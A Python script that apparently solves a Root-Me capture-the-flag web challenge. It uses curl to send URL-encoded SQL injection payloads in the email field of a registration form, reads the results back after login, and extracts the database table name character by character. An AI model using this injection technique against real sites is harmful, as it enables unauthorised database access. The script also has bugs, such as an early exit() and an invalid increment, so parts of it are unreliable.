#!/usr/bin/python

import os
import re
import sys

def urlencode(s):
	ignoreList = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_')
	acc = ''
	for c in s:
		if c in ignoreList:
			acc += c
		else:
			acc += '%' + hex(ord(c))[2:]
	return acc

class User:
	charList='abcdefghijkpqrstuvwxyz'
	def __init__(self, defaultName=''):
		if defaultName != '':
			self.name = defaultName
		else:
			self.name = User.charList[0]
		self.currentChar = 0

	def __repr__(self):
		return (self.name)

	def __str__(self):
		return self.name

	def next(self):
		self.currentChar = (self.currentChar + 1)%len(User.charList)
		self.name = list(self.name)
		self.name[-1] = User.charList[self.currentChar]
		if self.name[-1] == User.charList[0]:
			i = 2
			while i <= len(self.name):
				self.name[-i] = User.charList[(User.charList.index(self.name[-i]) + 1) % len(User.charList)]
				i += 1
			if self.name[0] == User.charList[0]:
				self.name = [User.charList[0]] + self.name
		self.name = ''.join(self.name)

# Get length of table_name
print('Getting length of table_name')
email = urlencode("' + LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)) + '")
user = User()
s = os.popen("curl http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
print(user,s)
while 'user exist' in s.lower():
	user.next()
	print(user),
	sys.stdout.flush()
	s = os.popen("curl http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
	print(s)
	raw_input()

s = os.popen("curl http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
print("'"+s+"'")
table_name_len = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
print('Table name length: {0}'.format(table_name_len))
exit()

# Get table_name
print('Getting table_name')
user += 1
tryList = list('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_')
i = 0
tableName = ''
while i < table_name_len:
	print(i, tableName)
	c = 32
	while c < 127:
		if chr(c) == "'":
			c += 1
			continue

		print(c,chr(c)),
		email = urlencode("{0}' < (SELECT table_name FROM information_schema.tables LIMIT 1) + '".format(tableName+chr(c)))
		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
		while 'user exist' in s.lower():
			user += 1
			print(user)
			sys.stdout.flush()
			s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=register -d 'username={0}&password=a&email={1}'".format(user,email)).read()
		s = os.popen("curl -s http://challenge01.root-me.org/web-serveur/ch33/?action=login -d 'username={0}&password=a'".format(user)).read()
		try:
			if s:
				result = re.match('(.*\n)*.*Email : (\d+).*', s).group(2)
			else:
				break
		except AttributeError:
			print('erreur:' + s)
			exit()
		if result == '0':
			tableName += chr(c-1)
			#print(list(tableName))
			break
		else:
			c += 1
	i += 1

print(user)
